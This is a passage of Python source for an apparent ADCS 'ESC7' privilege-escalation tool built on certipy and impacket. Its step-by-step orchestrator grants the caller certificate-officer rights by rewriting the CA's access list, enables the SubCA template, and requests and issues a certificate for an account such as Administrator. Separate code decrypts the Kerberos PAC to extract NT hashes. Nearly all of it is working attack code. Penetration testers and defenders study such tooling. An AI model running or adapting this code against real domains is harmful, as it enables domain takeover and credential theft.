                )
            except ESC7Error:
                raise
            except Exception as e:
                raise AuthError(
                    f"NT hash extraction failed: {e}",
                    hint=(
                        "The TGT was obtained successfully. "
                        "You can still use the ccache for pass-the-ticket."
                    ),
                ) from e

        return True

    def _extract_nt_hash(
        self,
        username:    str,
        domain:      str,
        upn:         Optional[str],
        as_rep,
        session_key,
        cipher,
        key,
        t_key:       bytes,
    ):
        try:
            ap_req               = AP_REQ()
            ap_req["pvno"]       = 5
            ap_req["msg-type"]   = e2i(
                constants.ApplicationTagNumbers.AP_REQ
            )
            ap_req["ap-options"] = constants.encodeFlags([])

            ticket = Ticket()
            ticket = ticket.from_asn1(as_rep["ticket"])
            seq_set(ap_req, "ticket", ticket.to_asn1)

            authenticator                      = Authenticator()
            authenticator["authenticator-vno"] = 5
            authenticator["crealm"]            = bytes(as_rep["crealm"])
            client_name = Principal()
            client_name = client_name.from_asn1(as_rep, "crealm", "cname")
            seq_set(authenticator, "cname", client_name.components_to_asn1)

            now                    = datetime.datetime.now(
                datetime.timezone.utc
            )
            authenticator["cusec"] = now.microsecond
            authenticator["ctime"] = KerberosTime.to_asn1(now)

            enc_auth                          = cipher.encrypt(
                session_key, 7, encoder.encode(authenticator), None
            )
            ap_req["authenticator"]           = noValue
            ap_req["authenticator"]["etype"]  = cipher.enctype
            ap_req["authenticator"]["cipher"] = enc_auth

        except Exception as e:
            raise AuthError(
                f"Failed to build AP-REQ for U2U: {e}"
            ) from e

        try:
            tgs_req = TGS_REQ()
            tgs_req["pvno"]     = 5
            tgs_req["msg-type"] = e2i(
                constants.ApplicationTagNumbers.TGS_REQ
            )
            tgs_req["padata"]                    = noValue
            tgs_req["padata"][0]                 = noValue
            tgs_req["padata"][0]["padata-type"]  = e2i(
                constants.PreAuthenticationDataTypes.PA_TGS_REQ
            )
            tgs_req["padata"][0]["padata-value"] = encoder.encode(ap_req)

            req_body = seq_set(tgs_req, "req-body")
            opts     = [
                e2i(constants.KDCOptions.forwardable),
                e2i(constants.KDCOptions.renewable),
                e2i(constants.KDCOptions.canonicalize),
                e2i(constants.KDCOptions.enc_tkt_in_skey),
                e2i(constants.KDCOptions.renewable_ok),
            ]
            req_body["kdc-options"] = constants.encodeFlags(opts)

            server_name = Principal(
                username,
                type=e2i(constants.PrincipalNameType.NT_UNKNOWN),
            )
            seq_set(req_body, "sname", server_name.components_to_asn1)
            req_body["realm"] = str(as_rep["crealm"])

            till              = (
                datetime.datetime.now(datetime.timezone.utc)
                + datetime.timedelta(days=1)
            )
            req_body["till"]  = KerberosTime.to_asn1(till)
            req_body["nonce"] = getrandbits(31)
            seq_set_iter(
                req_body, "etype",
                (
                    int(cipher.enctype),
                    e2i(constants.EncryptionTypes.rc4_hmac),
                ),
            )
            seq_set_iter(
                req_body, "additional-tickets",
                (ticket.to_asn1(TicketAsn1()),),
            )
        except Exception as e:
            raise AuthError(
                f"Failed to build TGS-REQ for U2U: {e}"
            ) from e

        try:
            tgs_raw = sendReceive(
                encoder.encode(tgs_req), domain, self.target.target_ip
            )
            tgs = decoder.decode(tgs_raw, asn1Spec=TGS_REP())[0]
        except KerberosError as e:
            raise AuthError(
                f"KDC error during U2U TGS-REQ: {e}",
                hint=(
                    "U2U (User-to-User) failed. The account may not support "
                    "this operation. Try using the ccache for PTT instead."
                ),
            ) from e
        except Exception as e:
            raise NetworkError(
                f"Failed to send U2U TGS-REQ: {e}"
            ) from e

        try:
            ciphertext = tgs["ticket"]["enc-part"]["cipher"]
            new_cipher = _enctype_table[
                int(tgs["ticket"]["enc-part"]["etype"])
            ]
            plaintext  = new_cipher.decrypt(session_key, 2, ciphertext)
        except Exception as e:
            raise CertificateError(
                f"Failed to decrypt TGS ticket: {e}"
            ) from e

        try:
            special_key    = Key(18, t_key)
            enc_ticket     = decoder.decode(
                plaintext, asn1Spec=EncTicketPart()
            )[0]
            ad_if_relevant = decoder.decode(
                enc_ticket["authorization-data"][0]["ad-data"],
                asn1Spec=AD_IF_RELEVANT(),
            )[0]
            pac_type = PACTYPE(ad_if_relevant[0]["ad-data"].asOctets())
            buff     = pac_type["Buffers"]
        except Exception as e:
            raise CertificateError(
                f"Failed to parse PAC from ticket: {e}",
                hint=(
                    "The ticket may not contain PAC data. "
                    "This can happen if the target account has no PAC."
                ),
            ) from e

        nt_hash = None
        lm_hash = "aad3b435b51404eeaad3b435b51404ee"

        try:
            for _ in range(pac_type["cBuffers"]):
                info_buffer = PAC_INFO_BUFFER(buff)
                data = pac_type["Buffers"][
                    info_buffer["Offset"] - 8:
                ][: info_buffer["cbBufferSize"]]

                if info_buffer["ulType"] == 2:
                    cred_info  = PAC_CREDENTIAL_INFO(data)
                    nc         = _enctype_table[cred_info["EncryptionType"]]
                    out        = nc.decrypt(
                        special_key, 16, cred_info["SerializedData"]
                    )
                    type1      = TypeSerialization1(out)
                    new_data   = out[len(type1) + 4:]
                    pcc        = PAC_CREDENTIAL_DATA(new_data)
                    for cred in pcc["Credentials"]:
                        cred_s = NTLM_SUPPLEMENTAL_CREDENTIAL(
                            b"".join(cred["Credentials"])
                        )
                        if any(cred_s["LmPassword"]):
                            lm_hash = cred_s["LmPassword"].hex()
                        nt_hash = cred_s["NtPassword"].hex()
                        break
                    break
                buff = buff[len(info_buffer):]
        except Exception as e:
            raise CertificateError(
                f"Failed to extract NTLM credentials from PAC: {e}",
                hint=(
                    "PAC decryption failed. Verify the AES key derivation "
                    "is correct and the account has NTLM credentials."
                ),
            ) from e

        if nt_hash is None:
            raise AuthError(
                "NT hash not found in PAC.",
                hint=(
                    "The PAC may not contain credential data. "
                    "Try authenticating with the ccache using PTT."
                ),
            )

        self.lm_hash = lm_hash
        self.nt_hash = nt_hash
        certipy_logging.info(
            f"Got hash for {upn!r}: {lm_hash}:{nt_hash}"
        )
        return nt_hash

class CA:
    def __init__(
        self,
        target,
        ca=None,
        template=None,
        officer=None,
        request_id=None,
        connection=None,
        scheme="ldaps",
        dynamic=False,
        config=None,
        timeout=5,
        **kwargs,
    ):
        self.target      = target
        self.ca          = ca
        self.template    = template
        self.officer     = officer
        self.request_id  = request_id
        self.scheme      = scheme
        self.dynamic     = dynamic
        self.config      = config
        self.timeout     = timeout
        self._connection = connection
        self._cert_admin  = None
        self._cert_admin2 = None

    @property
    def connection(self):
        if self._connection:
            return self._connection
        target = copy.copy(self.target)
        if getattr(target, "do_kerberos", False):
            if getattr(self.target, "dc_host", None) is None:
                raise AuthError(
                    "Kerberos authentication requires --dc-host.",
                    hint="Provide the DC FQDN with --dc-host.",
                )
            target.remote_name = self.target.dc_host
        target.target_ip = target.dc_ip
        try:
            self._connection = LDAPConnection(target)
            self._connection.connect()
        except Exception as e:
            _msg = str(e).lower()
            if "invalid credentials" in _msg or "49" in _msg:
                raise AuthError(
                    "LDAP authentication failed — invalid credentials.",
                    hint=(
                        "Verify the username and password. "
                        "If using hashes, ensure the format is LM:NT."
                    ),
                ) from e
            if "connection refused" in _msg or "timed out" in _msg:
                raise NetworkError(
                    f"Cannot connect to LDAP on {target.dc_ip}: {e}",
                    hint=(
                        "Ensure port 389/636 is reachable and the DC is online."
                    ),
                ) from e
            raise LDAPError(
                f"LDAP connection failed: {e}"
            ) from e
        return self._connection

    @property
    def cert_admin(self):
        if self._cert_admin is not None:
            return self._cert_admin
        try:
            from certipy.lib.rpc import get_dcom_connection
            dcom      = get_dcom_connection(self.target)
            interface = dcom.CoCreateInstanceEx(
                CLSID_ICertAdminD, IID_ICertAdminD
            )
            interface.get_cinstance().set_auth_level(
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY
            )
            self._cert_admin = ICertAdminD(interface)
        except DCOMError:
            raise
        except Exception as e:
            raise DCOMError(
                f"Failed to create ICertAdminD DCOM interface: {e}",
                hint=(
                    "Ensure the CA service (CertSvc) is running and "
                    "the account has DCOM launch permissions."
                ),
            ) from e
        return self._cert_admin

    @property
    def cert_admin2(self):
        if self._cert_admin2 is not None:
            return self._cert_admin2
        try:
            from certipy.lib.rpc import get_dcom_connection
            dcom      = get_dcom_connection(self.target)
            interface = dcom.CoCreateInstanceEx(
                CLSID_ICertAdminD, IID_ICertAdminD2
            )
            interface.get_cinstance().set_auth_level(
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY
            )
            self._cert_admin2 = ICertAdminD2(interface)
        except DCOMError:
            raise
        except Exception as e:
            raise DCOMError(
                f"Failed to create ICertAdminD2 DCOM interface: {e}",
                hint=(
                    "Ensure the CA service is running and the account "
                    "has ManageCA rights."
                ),
            ) from e
        return self._cert_admin2

    def issue(self) -> bool:
        if self.request_id is None:
            raise StepError(
                "Request ID is required to issue a certificate.",
                hint="Run step 4 first or provide --request-id.",
            )

        request                      = ICertAdminDResubmitRequest()
        request["pwszAuthority"]     = checkNullString(self.ca)
        request["pdwRequestId"]      = int(self.request_id)
        request["pwszExtensionName"] = checkNullString("\x00")

        try:
            resp = self.cert_admin.request(request)
        except DCERPCSessionError as e:
            err_str = str(e)
            if "E_ACCESSDENIED" in err_str or "0x80070005" in err_str:
                raise AuthError(
                    f"Access denied issuing request {self.request_id}.",
                    hint=(
                        "The account needs ManageCertificates right on the CA. "
                        "Verify step 2 (add officer) succeeded."
                    ),
                ) from e
            if "0x80094003" in err_str or "BAD_REQUESTSTATUS" in err_str:
                raise StepError(
                    f"Request {self.request_id} is not in a pending state.",
                    hint=(
                        "The certificate may have been issued immediately "
                        "(Request Disposition = Issue). "
                        "Check if the PFX was already saved in step 4. "
                        "If so, skip to step 6 with --start-from 6."
                    ),
                    recoverable=True,
                ) from e
            raise DCOMError(
                f"DCOM error issuing request {self.request_id}: {e}",
                hint="Check CA connectivity and account permissions.",
            ) from e
        except DCOMError:
            raise
        except Exception as e:
            raise DCOMError(
                f"Unexpected error issuing certificate: {e}"
            ) from e

        disposition = resp["pdwDisposition"]
        if disposition == 3:
            certipy_logging.info(
                f"Successfully issued certificate request {self.request_id}"
            )
            return True

        raise StepError(
            f"Failed to issue request {self.request_id}: "
            f"{_certsrv_error(disposition)}",
            hint=(
                "Verify the request is in pending state and "
                "the account has ManageCertificates right."
            ),
        )

    def get_templates(self) -> Optional[List[str]]:
        if not self.ca:
            raise ConfigError("CA name is required for get_templates.")
        request                  = ICertAdminD2GetCAProperty()
        request["pwszAuthority"] = checkNullString(self.ca)
        request["PropId"]        = CR_PROP_TEMPLATES
        request["PropIndex"]     = 0
        request["PropType"]      = 4
        try:
            resp = self.cert_admin2.request(request)
        except DCERPCSessionError as e:
            if "E_ACCESSDENIED" in str(e):
                raise AuthError(
                    "Access denied reading CA templates.",
                    hint="The account needs ManageCA or Enroll right.",
                ) from e
            raise DCOMError(
                f"Failed to get CA templates: {e}"
            ) from e
        except DCOMError:
            raise
        except Exception as e:
            raise DCOMError(
                f"Unexpected error getting templates: {e}"
            ) from e
        return (
            b"".join(resp["pctbPropertyValue"]["pb"])
            .decode("utf-16le")
            .split("\n")
        )

    def enable(self, disable: bool = False) -> bool:
        action = "disable" if disable else "enable"
        if not self.ca:
            raise ConfigError(f"CA name required to {action} a template.")
        if not self.template:
            raise ConfigError(f"Template name required to {action}.")

        current = self.get_templates()
        if current is None:
            raise StepError(
                f"Could not retrieve current template list from {self.ca!r}."
            )

        try:
            from certipy.commands.template import Template as CertipyTemplate
            tmpl_obj = CertipyTemplate(
                self.target, connection=self.connection
            )
            tmpl = tmpl_obj.get_configuration(self.template)
        except Exception as e:
            raise StepError(
                f"Failed to look up template {self.template!r} in AD: {e}",
                hint=(
                    "Verify the template name is correct and the account "
                    "can read the certificate template objects in AD."
                ),
            ) from e

        if tmpl is None:
            raise StepError(
                f"Template {self.template!r} not found in Active Directory.",
                hint=(
                    "Use 'certipy find' to list available templates. "
                    "SubCA is a built-in template that should always exist."
                ),
            )

        if disable:
            if tmpl.get("cn") not in current:
                _warn(
                    f"{tmpl.get('cn')!r} is not currently enabled on "
                    f"{self.ca!r} — nothing to disable."
                )
                return True
            idx     = current.index(tmpl.get("cn"))
            current = current[:idx] + current[idx + 2:]
        else:
            if tmpl.get("cn") in current:
                certipy_logging.info(
                    f"{tmpl.get('cn')!r} is already enabled on {self.ca!r}"
                )
                return True
            current = [
                tmpl.get("cn"), tmpl.get("msPKI-Cert-Template-OID")
            ] + current

        tpl_bytes = [
            bytes([c])
            for c in "\n".join(current).encode("utf-16le")
        ]
        request                            = ICertAdminD2SetCAProperty()
        request["pwszAuthority"]           = checkNullString(self.ca)
        request["PropId"]                  = CR_PROP_TEMPLATES
        request["PropIndex"]               = 0
        request["PropType"]                = 4
        request["pctbPropertyValue"]["cb"] = len(tpl_bytes)
        request["pctbPropertyValue"]["pb"] = tpl_bytes

        try:
            resp = self.cert_admin2.request(request)
        except DCERPCSessionError as e:
            if "E_ACCESSDENIED" in str(e):
                raise AuthError(
                    f"Access denied — ManageCA right required to {action} "
                    f"templates.",
                    hint=(
                        "The account must have ManageCA on the CA object. "
                        "Verify --user has this right."
                    ),
                ) from e
            raise DCOMError(
                f"DCOM error during template {action}: {e}"
            ) from e
        except DCOMError:
            raise
        except Exception as e:
            raise DCOMError(
                f"Unexpected error during template {action}: {e}"
            ) from e

        if resp["ErrorCode"] == 0:
            past = "disabled" if disable else "enabled"
            certipy_logging.info(
                f"Successfully {past} {tmpl.get('cn')!r} on {self.ca!r}"
            )
            return True

        raise StepError(
            f"Failed to {action} template {self.template!r}: "
            f"{_certsrv_error(resp['ErrorCode'])}",
            hint=(
                f"Verify the account has ManageCA right and "
                f"the template {self.template!r} exists."
            ),
        )

    def disable(self) -> bool:
        return self.enable(disable=True)

    def _modify_ca_security(
        self,
        user:       str,
        right:      int,
        right_type: str,
        remove:     bool = False,
    ):
        action = "remove" if remove else "add"

        # Resolve user SID
        try:
            user_obj = self.connection.get_user(user)
        except Exception as e:
            raise LDAPError(
                f"LDAP error looking up user {user!r}: {e}",
                hint="Verify LDAP connectivity and the username is correct.",
            ) from e

        if user_obj is None:
            raise ConfigError(
                f"User {user!r} not found in Active Directory.",
                hint=(
                    "Ensure the username is the sAMAccountName (e.g. ca-admin, "
                    "not ca-admin@domain.com). The account must exist in AD."
                ),
            )

        try:
            raw_sid = user_obj.get_raw("objectSid")
            if not raw_sid:
                raise ConfigError(
                    f"User {user!r} has no objectSid attribute.",
                )
            sid = ldaptypes.LDAP_SID(data=raw_sid[0])
        except ConfigError:
            raise
        except Exception as e:
            raise LDAPError(
                f"Failed to parse SID for user {user!r}: {e}"
            ) from e

        # Read current security descriptor
        req_get                  = ICertAdminD2GetCASecurity()
        req_get["pwszAuthority"] = checkNullString(self.ca)
        try:
            resp = self.cert_admin2.request(req_get)
        except DCERPCSessionError as e:
            if "E_ACCESSDENIED" in str(e):
                raise AuthError(
                    "Access denied reading CA security descriptor.",
                    hint="ManageCA right is required to read the CA DACL.",
                ) from e
            raise DCOMError(
                f"Failed to retrieve CA security descriptor: {e}"
            ) from e
        except DCOMError:
            raise
        except Exception as e:
            raise DCOMError(
                f"Unexpected error reading CA security: {e}"
            ) from e

        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
            sd.fromString(b"".join(resp["pctbSD"]["pb"]))
        except Exception as e:
            raise CertificateError(
                f"Failed to parse CA security descriptor: {e}",
                hint="The security descriptor may be malformed.",
            ) from e

        # Modify DACL
        found = False
        try:
            for i, ace in enumerate(sd["Dacl"]["Data"]):
                if ace["AceType"] != ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE:
                    continue
                if ace["Ace"]["Sid"].getData() != sid.getData():
                    continue
                found = True
                if remove:
                    if ace["Ace"]["Mask"]["Mask"] & right == 0:
                        certipy_logging.info(
                            f"{user!r} does not have {right_type} on "
                            f"{self.ca!r}"
                        )
                        return True
                    ace["Ace"]["Mask"]["Mask"] ^= right
                    if ace["Ace"]["Mask"]["Mask"] == 0:
                        sd["Dacl"]["Data"].pop(i)
                else:
                    if ace["Ace"]["Mask"]["Mask"] & right != 0:
                        certipy_logging.info(
                            f"{user!r} already has {right_type} on {self.ca!r}"
                        )
                        return True
                    ace["Ace"]["Mask"]["Mask"] |= right
                break

            if not found:
                if remove:
                    certipy_logging.info(
                        f"{user!r} has no {right_type} ACE on {self.ca!r}"
                    )
                    return True
                new_ace                        = ldaptypes.ACE()
                new_ace["AceType"]             = (
                    ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
                )
                new_ace["AceFlags"]            = 0
                new_ace["Ace"]                 = ldaptypes.ACCESS_ALLOWED_ACE()
                new_ace["Ace"]["Mask"]         = ldaptypes.ACCESS_MASK()
                new_ace["Ace"]["Mask"]["Mask"] = right
                new_ace["Ace"]["Sid"]          = sid
                sd["Dacl"]["Data"].append(new_ace)
        except ESC7Error:
            raise
        except Exception as e:
            raise CertificateError(
                f"Failed to modify DACL for {user!r}: {e}"
            ) from e

        # Write updated descriptor
        try:
            sd_bytes = [bytes([c]) for c in sd.getData()]
        except Exception as e:
            raise CertificateError(
                f"Failed to serialize security descriptor: {e}"
            ) from e

        req_set                  = ICertAdminD2SetCASecurity()
        req_set["pwszAuthority"] = checkNullString(self.ca)
        req_set["pctbSD"]["cb"]  = len(sd_bytes)
        req_set["pctbSD"]["pb"]  = sd_bytes

        try:
            resp = self.cert_admin2.request(req_set)
        except DCERPCSessionError as e:
            if "E_ACCESSDENIED" in str(e):
                raise AuthError(
                    f"Access denied writing CA security descriptor.",
                    hint=(
                        "ManageCA right is required to modify the CA DACL. "
                        "Verify the account has this right in the CA properties."
                    ),
                ) from e
            raise DCOMError(
                f"Failed to write CA security descriptor: {e}"
            ) from e
        except DCOMError:
            raise
        except Exception as e:
            raise DCOMError(
                f"Unexpected error writing CA security: {e}"
            ) from e

        if resp["ErrorCode"] == 0:
            past = "removed" if remove else "added"
            certipy_logging.info(
                f"Successfully {past} {right_type} for {user!r} on {self.ca!r}"
            )
            return True

        raise StepError(
            f"Failed to {action} {right_type} for {user!r}: "
            f"{_certsrv_error(resp['ErrorCode'])}",
        )

    def add_officer(self, officer: str):
        return self._modify_ca_security(
            officer,
            CertificateAuthorityRights.MANAGE_CERTIFICATES.value,
            "officer (ManageCertificates)",
        )

    def remove_officer(self, officer: str):
        return self._modify_ca_security(
            officer,
            CertificateAuthorityRights.MANAGE_CERTIFICATES.value,
            "officer (ManageCertificates)",
            remove=True,
        )

def build_target(
    username:     str,
    password:     Optional[str],
    domain:       str,
    dc_ip:        str,
    dc_host:      Optional[str] = None,
    use_kerberos: bool          = False,
    hashes:       Optional[str] = None,
) -> Target:
    if not username:
        raise ConfigError("Username is required.")
    if not domain:
        raise ConfigError("Domain is required.")
    if not dc_ip:
        raise ConfigError("DC IP is required.")
    if not password and not hashes and not use_kerberos:
        raise ConfigError(
            "No authentication method provided.",
            hint="Supply --password, --hashes, or --kerberos.",
        )

    try:
        options = argparse.Namespace(
            username=username,
            password=password,
            domain=domain,
            dc_ip=dc_ip,
            dc_host=dc_host,
            target_ip=None,
            ns=None,
            dns_tcp=False,
            timeout=10,
            hashes=hashes,
            no_pass=False,
            k=use_kerberos,
            kerberos=use_kerberos,
            aes=None,
            dynamic_endpoint=False,
        )
        return Target.from_options(options, dc_as_target=True)
    except Exception as e:
        raise ConfigError(
            f"Failed to build authentication target: {e}",
            hint=(
                "Verify all connection parameters are correct. "
                "If using Kerberos, ensure --dc-host is the FQDN."
            ),
        ) from e

def discover_ca(target) -> Tuple[str, str]:
    """Returns (ca_name, ca_fqdn)."""
    _info("Discovering CA via LDAP...")
    try:
        ldap_conn = LDAPConnection(target)
        ldap_conn.connect()
    except Exception as e:
        raise LDAPError(
            f"Failed to connect to LDAP for CA discovery: {e}",
            hint=(
                "Verify the DC IP, credentials, and that LDAP (389/636) "
                "is reachable."
            ),
        ) from e

    try:
        cas = ldap_conn.search(
            "(&(objectClass=pKIEnrollmentService))",
            search_base=(
                f"CN=Enrollment Services,CN=Public Key Services,"
                f"CN=Services,{ldap_conn.configuration_path}"
            ),
            attributes=["cn", "dNSHostName"],
        )
    except Exception as e:
        raise LDAPError(
            f"LDAP search for enrollment services failed: {e}",
            hint=(
                "Ensure the account can read the Configuration naming "
                "context in Active Directory."
            ),
        ) from e

    if not cas:
        raise StepError(
            "No certificate authorities found in Active Directory.",
            hint=(
                "Verify AD CS is installed and the account can read "
                "CN=Enrollment Services,CN=Public Key Services,CN=Services "
                "in the Configuration partition."
            ),
        )

    entries: List[Tuple[str, str]] = []
    for c in cas:
        name = c.get("cn") or ""
        fqdn = c.get("dNSHostName") or ""
        if name:
            entries.append((name, fqdn))

    if not entries:
        raise StepError(
            "Found enrollment service objects but could not read CN/FQDN.",
            hint="Verify LDAP read permissions on pKIEnrollmentService objects.",
        )

    if len(entries) == 1:
        name, fqdn = entries[0]
        _ok(f"Discovered CA: {name!r}  FQDN: {fqdn!r}")
        return name, fqdn

    _info("Multiple CAs found:")
    options = [f"{name}  ({fqdn})" for name, fqdn in entries]
    try:
        idx = _prompt_choice(options, prompt="Select CA")
        name, fqdn = entries[idx]
        _ok(f"Selected CA: {name!r}  FQDN: {fqdn!r}")
        return name, fqdn
    except ESC7Error:
        raise
    except Exception as e:
        raise ConfigError(f"CA selection failed: {e}") from e

# ESC7 Attack Orchestrator

class ESC7Attack:
    def __init__(self, args):
        self.args                        = args
        self.request_id: Optional[int]  = args.request_id
        self.pfx_path:   Optional[str]  = args.pfx_out
        self.ca_name:    Optional[str]  = args.ca
        self.ca_fqdn:    str            = args.target_host or ""
        self.issued_immediately: bool   = False
        self.debug:      bool           = args.debug

    def _target(self) -> Target:
        return build_target(
            self.args.user,
            self.args.password,
            self.args.domain,
            self.args.dc_ip,
            self.args.dc_host,
            self.args.kerberos,
            self.args.hashes,
        )

    # ── Step 1 ────────────────────────────────────────────────────────────────
    def step_discover_ca(self) -> None:
        _banner("STEP 1: CA Discovery")
        if self.ca_name and self.ca_fqdn and "@" not in self.ca_fqdn:
            _info(
                f"Using specified CA: {self.ca_name!r}  "
                f"FQDN: {self.ca_fqdn!r}"
            )
            return

        name, fqdn = discover_ca(self._target())
        self.ca_name  = name
        self.ca_fqdn  = fqdn
        self.args.ca  = name

        if not self.args.target_host or "@" in (self.args.target_host or ""):
            self.args.target_host = fqdn
            _ok(f"Set target-host to CA FQDN: {fqdn!r}")

        if not fqdn:
            _warn(
                "CA FQDN could not be determined from LDAP. "
                "The dNSHostName attribute may be missing."
            )
            _hint(
                "Provide --target-host manually with the CA server's FQDN."
            )

    # ── Step 2 ────────────────────────────────────────────────────────────────
    def step_add_officer(self) -> None:
        _banner("STEP 2: Granting Officer Rights")
        officer = (
            self.args.officer
            or self.args.user.split("@")[0].split("\\")[-1]
        )
        if not officer:
            raise ConfigError(
                "Officer account name could not be determined.",
                hint="Provide --officer explicitly.",
            )
        _info(f"Granting ManageCertificates to: {officer!r}")
        ca     = CA(self._target(), ca=self.ca_name)
        result = ca.add_officer(officer)
        if result is False:
            raise StepError(
                f"add_officer returned False for {officer!r}.",
                hint=(
                    "Verify the account has ManageCA right on the CA. "
                    "This is required to modify the CA DACL."
                ),
            )
        _ok(f"Officer rights granted to {officer!r}")

    # ── Step 3 ────────────────────────────────────────────────────────────────
    def step_enable_template(self) -> None:
        _banner(f"STEP 3: Enabling Template '{self.args.template}'")
        ca = CA(
            self._target(),
            ca=self.ca_name,
            template=self.args.template,
        )
        ca.enable()
        _ok(f"Template '{self.args.template}' enabled on {self.ca_name!r}")

    # ── Step 4 ────────────────────────────────────────────────────────────────
    def step_request(self) -> int:
        _banner("STEP 4: Requesting Certificate")

        if not self.args.upn:
            raise ConfigError(
                "Target UPN is required for certificate request.",
                hint="Provide --upn (e.g. Administrator@domain.local).",
            )
        if not self.args.target_host or "@" in self.args.target_host:
            raise ConfigError(
                f"Target host is invalid: {self.args.target_host!r}. "
                f"It must be the CA server FQDN, not a UPN.",
                hint=(
                    "Provide --target-host (e.g. WIN-XYZ.domain.local). "
                    "This was auto-discovered in step 1 — re-run from step 1."
                ),
            )

        _info(f"UPN:     {self.args.upn}")
        _info(f"CA Host: {self.args.target_host}")
        _info(f"CA:      {self.ca_name}")

        ns = argparse.Namespace(
            username=self.args.user,
            password=self.args.password,
            domain=self.args.domain,
            dc_ip=self.args.dc_ip,
            dc_host=self.args.dc_host,
            target_ip=None,
            ns=None,
            dns_tcp=False,
            timeout=10,
            hashes=self.args.hashes,
            no_pass=False,
            k=self.args.kerberos,
            kerberos=self.args.kerberos,
            aes=None,
            ca=self.ca_name,
            template=self.args.template,
            upn=self.args.upn,
            dns=self.args.target_host,
            ip=None,
            subject=self.args.subject,
            retrieve=0,
            on_behalf_of=None,
            pfx=None,
            key_size=2048,
            out=self.args.pfx_out,
            renewal_cert=None,
            archive_key=False,
            cax_cert=False,
            fetch_enrolled=False,
            dynamic=False,
            config=None,
        )

        request_exception = None
        target            = self._target()

        with LogCapture(self.debug) as capture:
            try:
                req = Request(target=target, **vars(ns))
                req.request()
            except SystemExit:
                pass
            except Exception as e:
                request_exception = e
                _debug(f"request() raised: {e}", self.debug)

            self.issued_immediately = capture.was_issued_immediately()
            rid     = capture.find_request_id()
            log_pfx = capture.find_pfx_path()

            if self.debug:
                capture.print_captured("Certipy request() output")

            if rid is None:
                for attr in (
                    "request_id", "req_id", "id", "pending_id",
                    "requestId", "_request_id",
                ):
                    val = getattr(req, attr, None) if 'req' in dir() else None
                    if val is not None:
                        try:
                            rid = int(val)
                            _debug(
                                f"Request ID from obj.{attr}: {rid}",
                                self.debug,
                            )
                            break
                        except (ValueError, TypeError):
                            pass

            # Check for hard errors in log output
            if not self.issued_immediately and rid is None:
                text = capture.get_text()
                if "E_ACCESSDENIED" in text or "access denied" in text.lower():
                    raise AuthError(
                        "Access denied during certificate request.",
                        hint=(
                            "The account may not have Enroll right on the "
                            f"'{self.args.template}' template. "
                            "Verify step 2 (add officer) succeeded and "
                            "the template is correctly enabled."
                        ),
                    )
                if "CERTSRV_E_TEMPLATE_DENIED" in text:
                    raise AuthError(
                        "Certificate request denied by template policy.",
                        hint=(
                            "The template may restrict who can enroll. "
                            "SubCA is normally restricted to Domain Admins — "
                            "the ManageCertificates right granted in step 2 "
                            "is what allows this. Verify step 2 succeeded."
                        ),
                    )
                if "could not connect" in text.lower() or "connection" in text.lower():
                    raise NetworkError(
                        f"Cannot connect to CA at {self.args.target_host}.",
                        hint=(
                            "Verify the CA FQDN is correct and RPC (135) "
                            "is reachable. Also try --dc-host with the "
                            "CA server's hostname."
                        ),
                    )

            if log_pfx and os.path.isfile(log_pfx):
                self.pfx_path = log_pfx

        if rid is None and request_exception is not None:
            raise StepError(
                f"Certificate request failed with exception: "
                f"{request_exception}",
                hint=(
                    "Check the certipy output above for details. "
                    "Common causes: wrong CA name, unreachable host, "
                    "or insufficient permissions."
                ),
            )

        if rid is None:
            _warn("Could not auto-detect Request ID from certipy output.")
            _hint(
                "Look for a line like 'Request ID is N' in the output above."
            )
            while True:
                raw = input(
                    f"  {C.Y}Enter Request ID: {C.X}"
                ).strip()
                if raw.isdigit() and int(raw) > 0:
                    rid = int(raw)
                    break
                _warn("Enter a positive integer.")

        self.request_id = rid

        if self.issued_immediately:
            _ok(
                f"Certificate issued IMMEDIATELY — "
                f"Request ID: {rid} — steps 5 and 6 will be skipped."
            )
        else:
            _ok(f"Certificate request pending — Request ID: {rid}")

        return rid

    # ── Step 5 ────────────────────────────────────────────────────────────────
    def step_issue(self) -> None:
        _banner("STEP 5: Issuing Pending Request")

        if self.issued_immediately:
            _ok(
                "Certificate was issued immediately in step 4 — "
                "skipping this step."
            )
            return

        if self.request_id is None:
            raise StepError(
                "No request ID available for issue step.",
                hint=(
                    "Run step 4 first, or provide --request-id when "
                    "using --start-from 5."
                ),
            )

        _info(f"Request ID: {self.request_id}")
        ca = CA(
            self._target(),
            ca=self.ca_name,
            request_id=self.request_id,
        )
        try:
            ca.issue()
        except StepError as e:
            if e.recoverable:
                # Already issued — treat as success and continue
                _warn(str(e))
                _hint(str(e.hint))
                _warn(
                    "Treating as already-issued and continuing to step 6."
                )
                self.issued_immediately = True
                return
            raise
        _ok(f"Request {self.request_id} issued successfully.")

    # ── Step 6 ────────────────────────────────────────────────────────────────
    def step_retrieve(self) -> None:
        _banner("STEP 6: Retrieving Certificate")

        # If cert was issued immediately and PFX already on disk → skip
        if (
            self.issued_immediately
            and self.pfx_path
            and os.path.isfile(self.pfx_path)
        ):
            _ok(
                f"Certificate already saved at {self.pfx_path!r} — "
                f"skipping retrieve."
            )
            return

        if self.request_id is None:
            raise StepError(
                "No request ID available for retrieve step.",
                hint=(
                    "Provide --request-id when using --start-from 6."
                ),
            )

        ns = argparse.Namespace(
            username=self.args.user,
            password=self.args.password,
            domain=self.args.domain,
            dc_ip=self.args.dc_ip,
            dc_host=self.args.dc_host,
            target_ip=None,
            ns=None,
            dns_tcp=False,
            timeout=10,
            hashes=self.args.hashes,
            no_pass=False,
            k=self.args.kerberos,
            kerberos=self.args.kerberos,
            aes=None,
            ca=self.ca_name,
            template=self.args.template,
            upn=self.args.upn,
            dns=self.args.target_host,
            ip=None,
            subject=self.args.subject,
            retrieve=self.request_id,
            on_behalf_of=None,
            pfx=None,
            key_size=2048,
            out=self.args.pfx_out,
            renewal_cert=None,
            archive_key=False,
            cax_cert=False,
            fetch_enrolled=False,
            dynamic=False,
            config=None,
        )

        retrieve_exception = None
        target             = self._target()

        with LogCapture(self.debug) as capture:
            try:
                req = Request(target=target, **vars(ns))
                req.retrieve()
            except SystemExit:
                pass
            except Exception as e:
                retrieve_exception = e
                _debug(f"retrieve() raised: {e}", self.debug)

            log_pfx = capture.find_pfx_path()
            if self.debug:
                capture.print_captured("Certipy retrieve() output")

            text = capture.get_text()
            if "E_ACCESSDENIED" in text or "access denied" in text.lower():
                raise AuthError(
